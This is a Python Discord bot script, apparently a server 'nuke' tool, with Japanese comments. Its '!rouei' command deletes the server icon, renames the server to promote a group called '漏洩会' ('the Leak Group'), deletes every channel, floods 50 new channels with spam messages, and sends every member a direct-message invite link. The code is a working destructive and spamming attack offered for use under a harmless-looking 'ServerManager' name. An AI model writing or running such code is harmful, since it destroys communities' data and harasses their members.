import discord
import asyncio
import os
from discord.ext import commands

class ServerManager(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    @commands.has_permissions(administrator=True)
    async def rouei(self, ctx):

        # 非同期を管理
        tasks = []
       
        # サーバーアイコン削除
        tasks.append(self.delete_server_icon(ctx.guild))
       
        # サーバー名変更
        tasks.append(self.change_server_name(ctx.guild))
       
        # チャンネル削除と作成
        tasks.append(self.manage_channels(ctx.guild))
       
        # メッセージ送信
        tasks.append(self.send_messages_to_members(ctx.guild))
       
        # 非同期
        await asyncio.gather(*tasks, return_exceptions=True)

    async def delete_server_icon(self, guild):

        try:
            await asyncio.sleep(0)  # ping
            if guild.icon:
                await guild.edit(icon=None)
                print("サーバーアイコンを削除しました")
        except Exception as e:
            print(f"アイコン削除エラー: {e}")

    async def change_server_name(self, guild):

        try:
            await asyncio.sleep(0)  # ping
            await guild.edit(name="漏洩会の傘下") # サーバー名
            print("サーバー名を変更しました")
        except Exception as e:
            print(f"サーバー名変更エラー: {e}")

    async def manage_channels(self, guild):

        try:
            # チャンネル削除
            for channel in guild.channels:
                try:
                    await asyncio.sleep(0)  # ping
                    await channel.delete()
                except Exception as e:
                    print(f"チャンネル削除エラー: {e}")
           
            # チャンネルを50個作成
            for i in range(50):
                try:
                    await asyncio.sleep(0)  # ping
                    channel = await guild.create_text_channel(f"test-channel-{i+1}")
                   
                    # メッセージ送信
                    asyncio.create_task(self.send_test_messages(channel))
                   
                except Exception as e:
                    print(f"チャンネル作成エラー: {e}")
                   
        except Exception as e:
            print(f"チャンネル管理エラー: {e}")

    async def send_test_messages(self, channel):
        try:
            for i in range(20):
                await asyncio.sleep(0)  # ping
                await channel.send("test")
        except Exception as e:
            print(f"メッセージ送信エラー: {e}")

    async def send_messages_to_members(self, guild):

        try:
            for member in guild.members:
                if not member.bot:  # memberのみ
                    try:
                        await asyncio.sleep(0)  # ping
                        await member.send("# 漏洩会に参加 \n discord.gg/ozeunko")
                    except Exception as e:
                        print(f"DM送信エラー {member}: {e}")
        except Exception as e:
            print(f"メンバーDMエラー: {e}")

# login
intents = discord.Intents.all()
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'{bot.user} login')
    await bot.add_cog(ServerManager(bot))

# token
bot.run(os.getenv('DISCORD_BOT_TOKEN'))
